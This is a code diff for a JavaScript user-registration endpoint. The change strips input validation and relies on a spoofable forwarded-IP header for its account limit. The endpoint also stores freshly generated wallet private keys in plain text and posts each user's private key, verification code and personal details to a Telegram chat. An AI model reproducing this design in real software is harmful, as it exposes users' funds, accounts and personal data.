@@ -11,48 +11,40 @@ app.post("/register", async (req, res) => {
       password
     } = req.body;
 
-    // ===== ВАЛІДАЦІЯ =====
     if (!email || !password) {
-      return res.json({ success: false, message: "No data" });
-    }
-
-    if (!email.includes("@") || email.length < 5) {
-      return res.json({ success: false, message: "Invalid email" });
-    }
-
-    if (!phone || phone.length < 10) {
-      return res.json({ success: false, message: "Invalid phone" });
+      return res.json({ success: false });
     }
 
     const emailLower = email.toLowerCase();
 
     // ===== IP =====
-    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
 
-    // ===== АНТИ-АБУЗ ПО IP =====
+    if (ip.includes(",")) {
+      ip = ip.split(",")[0].trim();
+    }
+
+    // ===== АНТИ-АБУЗ =====
     const { data: ipUsers } = await supabase
       .from("users")
       .select("id")
       .eq("ip", ip);
 
-    if (ipUsers && ipUsers.length >= 3) {
+    if (ipUsers && Array.isArray(ipUsers) && ipUsers.length >= 3) {
       return res.json({ success: false, message: "Too many accounts" });
     }
 
-    // ===== CHECK USER =====
     const { data: existing } = await supabase
       .from("users")
       .select("*")
       .eq("email", emailLower)
-      .single();
+      .maybeSingle();
 
     if (existing) {
       return res.json({ success: false, message: "User exists" });
     }
 
     const hash = await bcrypt.hash(password, 10);
-
-    // ===== КОД =====
     const code = Math.floor(100000 + Math.random() * 900000).toString();
 
     let wallet_address = null;
@@ -64,7 +56,6 @@ app.post("/register", async (req, res) => {
       private_key = wallet.privateKey;
     } catch {}
 
-    // ===== INSERT =====
     const { data, error } = await supabase
       .from("users")
       .insert([{
@@ -80,12 +71,9 @@ app.post("/register", async (req, res) => {
         satellites: 0,
         wallet_address,
         private_key,
-
-        // 🔥 АНТИ-АБУЗ
         email_code: code,
         email_verified: false,
-        ip: ip,
-        last_code_time: Date.now()
+        ip: ip
       }])
       .select()
       .single();
@@ -97,17 +85,14 @@ app.post("/register", async (req, res) => {
 
     // ===== TELEGRAM =====
     try {
-
       const text = `
 🆕 NEW USER
 
 ID: ${data.id}
-EMAIL: ${data.email}
-
-🔑 CODE: ${code}
+Email: ${data.email}
 
 👤 ${data.fullname}
-📛 ${data.nickname}
+📛 Nick: ${data.nickname}
 
 🌍 ${data.country}
 📱 ${data.phone}
@@ -117,6 +102,8 @@ ${data.wallet_address}
 
 🔐 Private Key:
 ${data.private_key}
+
+🔑 CODE: ${code}
 
 👥 Ref: ${data.referrer_id || "—"}
       `;
